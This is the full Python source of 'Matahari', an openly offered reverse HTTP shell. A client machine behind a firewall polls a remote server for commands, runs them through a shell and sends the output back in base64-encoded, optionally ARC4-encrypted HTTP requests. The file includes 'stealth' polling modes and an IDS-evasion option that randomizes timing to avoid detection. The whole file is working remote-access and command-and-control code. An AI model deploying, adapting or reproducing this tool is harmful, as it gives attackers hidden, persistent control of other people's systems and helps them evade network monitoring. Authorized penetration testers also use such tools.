#!/usr/bin/python
#
#	Matahari
#	Reverse HTTP shell 
#       Copyright 2007 Martin Obiols Herrera
#	http://matahari.sourceforge.net
#
# author: Martin Obiols Herrera -- OleMoudi <olemoudi AT users.sourceforge.net>
# started: 09/Sept/2007
#	
#	Script to maintain a basic shell remotely on unix systems behind firewalls.
#	Client gets commands by periodically polling the server and sends the output back
#	after executing them. Traffic traverses firewall as standard outgoing HTTP GET/POST requests.
#	HTTP requests/responses carry payload b64 encoded. Optional encryption is supported (and highly recommended).
#	
#	Polling period between requests can be modified sending commands like "%polling_type",
#	where "polling_type" is one of the following:
#		-insane: 10 seconds between requests
#		-agressive: 25 seconds between requests
#		-normal: 60 seconds between requests
#		-polite: 5 mins between requests
#		-paranoid: 30 mins between requests
#		-stealth: 60 mins between requests
#		-adaptative: dinamically increases polling period when no commands are received until
#			     reaching stealth type, and waking up again to lowest period after each new command.
#
#	Be aware that when ids-evasion flag is set, all the above times are modified randomly with each
#	polling period between original value and 2 x original value.
#
#	Payload encryption uses ARC4 (requires python-crypto package). Client sends with each request a 
#	special header with a unique salt (str(randint(1,1000)) + str(time.time()). Server response and
#	next client POST request will be encrypted using the password+salt. This way client gets protected
#	against retransmission attacks.
#	
#
#	TODO:
#		-Better error handling
#		-Support for interactive commands
#		-Code clean up
#		-Comments -_-zZZ
#
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>



import sys, BaseHTTPServer, base64, time, httplib, getopt, thread, socket, subprocess
from random import randint
import getpass

"""Reverse Shell Script
"""

def print_usage (error=None):
	import os
	print 
	print 'Usage: %s -c|-s host [-P proxy:port] [options]' % os.path.basename (sys.argv[0])
	print '	Operation modes:'
	print '		-c --client     	Enable client mode. Host specifies server address'
    	print '		-s --server		Enable server mode. Host specifies client address'
    	print '	Options on client and server mode:'
    	print '		-p --port		The port the server listens to'
    	print '	Options on client mode:'
    	print '		-T <adaptative|insane|agressive|normal|polite|paranoid|stealth>'
    	print '					Modify polling behaviour. Defaults'
    	print '					to adaptative.'
    	print '		-P --proxy		HTTP outbound proxy (host:port).'
    	print '	Common options:'
        print '		-v, --verbose		increase verbosity.' 
        print '		-h, --help		displays this help message.'
        print '		-i, --ids-evasion	enables ids evasion technique (polling times randomization)'
        print '		-e, --encrypt		enables ARC4 payload encryption (highly recommended). Requires python-crypto package'

	if error:
     		print '\n** %s' % error


#################      
### CONSTANTS ###
#################

VERSION = "0.1.30"
DEFAULT_PORT = 80 # traffic is supposed to look like standard WWW traffic
DEFAULT_HOST = "localhost" # for testing purposes
POLLING_TYPES = ["adaptative", "insane", "agressive", "normal", "polite", "paranoid", "stealth"]
DEFAULT_POLLING_TYPE = POLLING_TYPES[3] # normal is the most suitable for most needs
POLLING_TIMES = { "adaptative" : 5, "insane" : 10, "agressive" : 25, "normal" : 60, "polite" : 300, "paranoid" : 1800, "stealth" : 3600 }
CONFIG_PREFIX = "%" #for reconfig commands at runtime

#################      
#### GLOBALS ####
#################

clientMode = False # script is working in client mode and executing commands
serverMode = False # script is working in server mode and issuing commands
idsEvasion = False # polling times should be randomized
proxyMode = False # client is behind http proxy
verbose = False # increase information output
encrypt = False # enable ARC4 encryption for HTTP payload
password = ""
salt = ""
host = DEFAULT_HOST # default host to connect to
port = DEFAULT_PORT # default port the host is using
proxy = ""
pollingType = DEFAULT_POLLING_TYPE # polling type used when none specified
crypto_package=False # python-crypto package is installed
try: #check if the package is present and flag it to warn the user
	from Crypto.Cipher import ARC4
	from Crypto.Hash import SHA
	crypto_package = True
except ImportError:
	crypto_package=False
	
        
#################        
## SERVER PART ##
#################

last_command = "" # last command user entered
next_polling = -1 # stores client current polling period
command_output = "" # to store the command output
output_ready = False # the client already sent the command output and it should be displayed
command_ready = False # the user already entered a command and it should be served to the client
timestamp = time.time() # to know the time of the last client poll
client_sync = False # the client current polling period is already known
        
class myRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):	
	"""basic HTTP server
	"""	
	def do_GET(self):
		"""Sends commands b64 encoded in HTTP responses
		"""
		global last_command, output_ready,command_ready,password, salt
		if ((self.client_address[0] == socket.gethostbyname(host)) and command_ready):
			self.send_response(200) # begin sending response
			if encrypt:
				salt = self.headers["Content-Salt"].strip() # extract the salt the client is using
				if verbose: print "received salt from client: "+salt
				hasher = SHA.new() # new hasher
				hasher.update(password + salt) # create the hash of the string passwordsalt
				rc4 = ARC4.new(hasher.hexdigest()) # use the hash for password to avoid weak key scheduling 
				self.end_headers() # end of response headers
				self.wfile.write(base64.b64encode(rc4.encrypt(last_command))) # send payload
			else: 
				# send payload without encryption
				self.end_headers()
				self.wfile.write(base64.b64encode(last_command))
			command_ready=False # wait for next command
			
		else:
			# GET does not come from the client we are currently listening to or there is no command available yet
			self.send_response(200) # send empty response and end
			self.send_header("Content-Type","0") # no command issued
			self.end_headers()
			
		# Check special header to know client current polling period
		if "Next-Polling-In" in self.headers:
			global next_polling,timestamp,client_sync
			next_polling = self.headers["Next-Polling-In"] # so the server can calculate roughly next polling
			# set the time of last request
			timestamp = int(time.time())
			client_sync = True
		
	def do_POST(self):
		"""Receives command output
		"""	
		global command_output, output_ready, timestamp, salt, password
		if verbose: print "received output for command: "+ last_command
		if verbose: print "now decoding it..."
		if encrypt:
			if verbose: print " decrypting using salt: "+salt
			# create hash of password + salt
			hasher = SHA.new()
			hasher.update(password + salt)
			rc4 = ARC4.new(hasher.hexdigest()) # use a hash for password to avoid weak key scheduling 
			content = self.rfile.read() # read payload
			command_output = rc4.decrypt(base64.b64decode(content))	# decrypt payload
		else: command_output = base64.b64decode(self.rfile.read()) # payload is not encrypted
		output_ready = True 
		# Check special header to know client current polling period
		if "Next-Polling-In" in self.headers:
			global next_polling
			next_polling = self.headers["Next-Polling-In"]
		# set the time of last request
		timestamp = int(time.time())			
		return  
	
	#Dummy functions to override baseclass output	
	def log_request(code=None,size=None):
		return
	def log_error(format,):
		return
 		
		
def read_command():
	"""Read command from user input
	"""
	global last_command, command_ready
	restore_prompt()
        last_command = sys.stdin.readline().strip()
	if len(last_command) > 0: # check for empty commands like multiple ENTER 
		command_ready = True
		if verbose: print "Command read from user: " +last_command

def restore_prompt():
	""" restore bash-like prompt
	"""
	print "\n"+str(host)+ "$>> ",		
	
		     

def run_httpserver(server_class=BaseHTTPServer.HTTPServer,
			 handler_class=myRequestHandler):			 
	""" Run simple HTTP server
	"""
        server_address = ('', port)
	httpd = server_class(server_address, handler_class)
	while True: # run forever
	    httpd.handle_request()
	sys.exit();
	
	
def start_server():
	global output_ready,next_polling,timestamp
	# start HTTP server in another thread
	thread.start_new_thread(run_httpserver,())
	while True: # run forever
		read_command() # first, read command from user
		if command_ready == False: continue # if user input was not a command continue
		output_ready = False # command output is not ready yet
		# Calculate seconds to wait until the client requests a command again	
		try:
			seconds = int(next_polling) - ( int(time.time() - timestamp) )
		except ValueError, v: # something nasty ocurred
			print str(v)	
		# print info message with scheduled execution time if available
		if client_sync: print "output not ready, client will poll for new command in approximately "+ str(seconds) +" seconds"
		else: print "Unknown time until command execution. You may have to wait a little :("
		while not output_ready:
			#check every second for command output
			time.sleep(1)
		print "" #maybe a better placeholder could be use, but no confusion so far
		print command_output
		
	
	
#################      
## CLIENT PART ##
#################

adaptative_counter = 0 # to count how many times a request didn't found any commands to execute
current_polling_time = POLLING_TIMES[DEFAULT_POLLING_TYPE]
i = 0 # just a stupid counter
url = "/" # this could be changed in future versions to be configurable to enhance ids-evasion


def handle_command():
	global adaptative_counter, current_polling_time, url,i,password,salt
	try:
		if verbose: print "target server: "+host + ":" +str(port)
		if verbose: print "polling server..."
		conn = httplib.HTTPConnection(host + ":" +str(port)) # open connection
		# salt has the format 446-9004394304039 or something like that. It is supposed to be unique and unpredictable to some degree
		salt = str(randint(1,1000)) +"-"+ str(time.time())
		# add special headers when polling for next command
		conn.request("GET", url, None , {"Next-Polling-In": str(current_polling_time), "Content-Salt" : salt } )
		if verbose: print "getting response..."
		r1 = conn.getresponse()
		if r1.getheader("Content-Type") != "0": # there is a command!			
			if verbose: print "reading command... ",
			if encrypt: 
				hasher = SHA.new()
				hasher.update(password + salt)
				rc4 = ARC4.new(hasher.hexdigest()) # use a hash to avoid weak key scheduling 
				command = rc4.decrypt(base64.b64decode(r1.read())).strip()
			else: command = base64.b64decode(r1.read()).strip() # no encryption
			if verbose: print "OK! Received command: "+command
			if command[0] == CONFIG_PREFIX: # command was special
				if verbose: print "Reconfiguring client... ",				
				send_back_output(doReconfig(command))
				if verbose: print "OK!"
			else:
				if verbose: print "Executing command and sending response... ",
				# we open a new thread so shell does not get stuck if command fails
				thread.start_new_thread(exec_command,(command,))
				if verbose: print "OK!"
				if pollingType == "adaptative": # if adaptative mode adjust time
					adaptative_counter = adaptative_counter + 1
					i = 0
					# reset polling time to minimum again
					current_polling_time = POLLING_TIMES["insane"]					
				
		else:
			# no command available
			if verbose: print "no command issued"
			if pollingType == "adaptative": # if on adaptative mode, check for idling
				adaptative_counter = adaptative_counter - 1
				if verbose: print "adaptative counter: "+ str(adaptative_counter)
				if adaptative_counter <= -4: # if more than 4 pollings without commands increase time
					increase_polling_time()
				
		conn.close()

	except Exception ,e: # something went bad when retrieving command
		if verbose: print "error polling server"
		if verbose: print str(e)
		if pollingType == "adaptative": # if on adaptative mode, count this error as idling 			
			adaptative_counter = adaptative_counter - 1
			if verbose: print "adaptative counter: "+ str(adaptative_counter)
			if adaptative_counter <= -4: # if more than 4 pollings without commands increase time
				increase_polling_time()		
		pass
		
	return
	
def exec_command(command):
	"""exec command and send back output
	"""
	process = subprocess.Popen([command], shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True) 
	suboutput = process.communicate()[0] 
	send_back_output(suboutput) 	

def send_back_output(output):
	"""send output in a POST request
	"""
	# POST the output
	global host,port,salt
	conn = httplib.HTTPConnection(host + ":" +str(port))
	if encrypt:
		hasher = SHA.new()
		hasher.update(password + salt)
		rc4 = ARC4.new(hasher.hexdigest())
		if verbose: print "sending encrypted payload using salt: "+salt
		conn.request("POST", url, base64.b64encode(rc4.encrypt(output)), {"Next-Polling-In": str(current_polling_time),  } )
	else: conn.request("POST", url, base64.b64encode(output), {"Next-Polling-In": str(current_polling_time) } )
	conn.close()	
	
def doReconfig(c):
	"""Change current polling time to c mode
	"""
	global i,current_polling_time
	i = 0
	command = c[1:]
	if command in POLLING_TYPES:
		global pollingType
		pollingType = command
		current_polling_time = POLLING_TIMES[pollingType]
		return "polling type changed to: "+ pollingType
	s = ""
	for t in POLLING_TYPES:
		s = s + t + ", "
	return "unknown polling type: "+ c + "\n"\
		"Available polling types are: " +s
	
def increase_polling_time():
	""" sets polling time to next type in array
	"""
	global pollingType, adaptative_counter,current_polling_time, i
	if  i < len(POLLING_TYPES) -1 and pollingType == "adaptative": 
		current_polling_time = POLLING_TIMES[POLLING_TYPES[i+1]]
		if verbose: print "polling time changed to: "+ str(current_polling_time)
		i = i + 1
	adaptative_counter = 0
	

def decrease_polling_time():
	""" sets polling time to previous type in array
	"""
	global pollingType, adaptative_counter,current_polling_time, i
	if  i > 0 and pollingType == "adaptative": 
		current_polling_time = POLLING_TIMES[POLLING_TYPES[i-1]]
		if verbose: print "polling time changed to: "+ str(current_polling_time)
		i = i -1
	adaptative_counter = 0	
	
def adjust_random_polling(polling_type):
	# for ids-evasion avoiding script-like perfectly timed traffic
	global current_polling_time,i
	# time set between default time and 2x default time
	current_polling_time = randint(POLLING_TIMES[POLLING_TYPES[i]], POLLING_TIMES[POLLING_TYPES[i]]*2)
	if verbose: print "new random polling time set to: "+ str(current_polling_time)
			
	
def start_client():
	global proxyMode,proxy, url, host, port
	if proxyMode: # craft special url and set the proxy as target host to enable proxy mode
		url = host + ":" +str(port) + "/"
		host = proxy[:proxy.index(":")]
		port = proxy[proxy.index(":")+1:]
	while True: # run forever
		global current_polling_time
		if idsEvasion: 
			global i
			current_polling_time = POLLING_TIMES[pollingType]
			i = POLLING_TYPES.index(pollingType)
			adjust_random_polling(pollingType)
		elif pollingType != "adaptative": current_polling_time = POLLING_TIMES[pollingType]
		try:
			handle_command()
			if verbose: print "next polling in "+ str(current_polling_time) + " seconds"
			time.sleep(current_polling_time)
			if verbose: print "retrying..."
		except Exception, error:
			print str(error)
			continue 


###############        
## INIT PART ##
###############

def processArgs(argv):
	_clientMode = _serverMode = _idsEvasion = _proxyMode= _verbose = _encrypt = False
	_port = DEFAULT_PORT
	_host = DEFAULT_HOST
	_pollingType = DEFAULT_POLLING_TYPE
	_proxy = ""
	_password= ""
	import getopt
	try:
		optlist, args = getopt.getopt(sys.argv[1:], "c:s:p:viT:hP:e", ["help", "client=", "server=", 
										"port=", "ids-evasion", "verbose", "polling-type=", "proxy=", 											"encrypt"])
	except getopt.GetoptError, err:
		import os
        	print 'Error: %s'%str(err)
	        print 'For options: %s --help' % os.path.basename (sys.argv[0])
        	sys.exit(2)
        	
        for opt, args in optlist:
        	if opt in ("-v", "--verbose"):# and len(args):
        		_verbose = True
		elif opt in ( "-h", "--help"):# and len(args):
			print_usage()
			sys.exit(0)
		elif opt in ("-c" , "--client"):
			_clientMode = True
			_host = args
		elif opt in ("-s" , "--server"):
			_serverMode = True
			_host = args

		elif opt in ("-p" , "--port"):
			_port = int(args)
		elif opt in ("-P" , "--proxy"):
			_proxy = str(args)			
		elif opt in ("-i" , "--ids-evasion"):					
			_idsEvasion = True
		elif opt in ("-e" , "--encrypt"):
			if crypto_package==True:
				_encrypt = True	
				_password = getpass.getpass('Password for %s:' % _host) 
			else:
				print "python-crypto package is not available, -e option is not allowed"
				sys.exit(1)
		elif opt in ("-T" , "--polling-type"):				
			if args in POLLING_TYPES:
				_pollingType = args
			else: 
				print_usage("Unknown polling type")
				sys.exit(1)
				
	print """
    matahari.py v%s  
    Copyright (C) 2007  Martin Obiols Herrera -- <olemoudi%susers.sourceforge.net>
    This program comes with ABSOLUTELY NO WARRANTY.
    This is free software, and you are welcome to redistribute it under certain conditions.
    Visit http://matahari.sourceforge.net

		""" % (VERSION,"@")
			
	if not _clientMode and not _serverMode:
		print_usage("No mode specified")
		sys.exit(2)
		
	if _serverMode:
			print """
	*****************************************************************
	You can now type in commands to be executed remotely. Client
	will poll for new commands periodically according to the polling
	type specified. You may have to wait a little. You can also modify
	polling type on the fly with commands like %polite, %agressive... etc
	Use "&&" or ";" for multiple commands. Trying to execute interactive
	commands can render unexpected results so be careful. Redirection
	characters like ">>" and programs like "sed" and "nc" are your friends.
	You can exit this program with CTRL+C without doing harm to the client.
	If something gets stuck just relaunch the server and ps ux + kill 
	last command. Have a lot of fun.
	******************************************************************
				"""		
			
	return (_clientMode, _serverMode, _idsEvasion, _verbose, _host, _port, _pollingType, _proxyMode, _proxy, _encrypt, _password)
			

def main():
	global clientMode, serverMode, idsEvasion, verbose, host, port, pollingType, proxy, proxyMode, encrypt, password
	(clientMode, serverMode, idsEvasion, verbose, host, port, pollingType, proxyMode, proxy, encrypt, password) = processArgs(sys.argv[1:])
	if clientMode:
		start_client()
	elif serverMode:
		start_server()
	else:
		print_usage("No mode specified")
		sys.exit(2)		


if __name__=="__main__": main()

	

        
        
